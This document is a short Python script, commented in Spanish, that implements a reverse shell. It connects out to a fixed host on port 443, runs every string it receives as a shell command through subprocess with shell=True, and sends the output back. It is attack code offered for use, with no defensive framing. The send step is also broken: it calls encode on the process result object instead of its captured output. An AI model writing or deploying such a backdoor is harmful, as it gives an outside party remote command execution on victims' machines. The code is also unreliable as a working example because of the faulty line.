import socket
import subprocess

def main():
    # Define la dirección IP y el puerto del servidor
    host = "192.168.1.100"
    port = 443

    # Crea un socket TCP/IP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Conecta el socket al servidor
    s.connect((host, port))

    # Crea un bucle infinito para recibir y enviar datos
    while True:
        # Recibe datos del servidor
        data = s.recv(1024)

        # Si no hay datos, la conexión se ha cerrado
        if not data:
            break

        # Imprime los datos recibidos
        print(data.decode())

        # Envia los datos de entrada al servidor
        command = data.decode()
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        s.sendall(output.encode())

if __name__ == "__main__":
    main()
